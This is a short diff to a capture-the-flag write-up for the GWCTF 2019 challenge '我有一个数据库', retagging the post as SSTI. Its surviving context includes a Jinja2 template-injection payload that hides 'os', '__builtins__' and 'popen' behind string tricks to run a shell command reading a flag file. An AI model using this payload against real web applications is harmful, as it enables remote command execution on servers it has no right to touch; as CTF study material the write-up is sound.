@@ -6,8 +6,8 @@ date: "2024-08-25T09:57:40"
 lastmod: "2024-08-25T09:57:40"
 image: ""
 license: ""
-categories: ["复现"]
-tags: ["php"]
+categories: ["赛题"]
+tags: ["SSTI"]
 ---
 # [GWCTF 2019]我有一个数据库
 
@@ -157,4 +157,3 @@ num=uQM6bAqK8Kab8sATWpqE
 
 {%set ls='so'[::-1]%}{%print cycler.next.__globals__['__b''uiltins__']['__i''mport__'](ls)['po''pen']('tac /flag_1s_Hera').read()%}
 ```
-
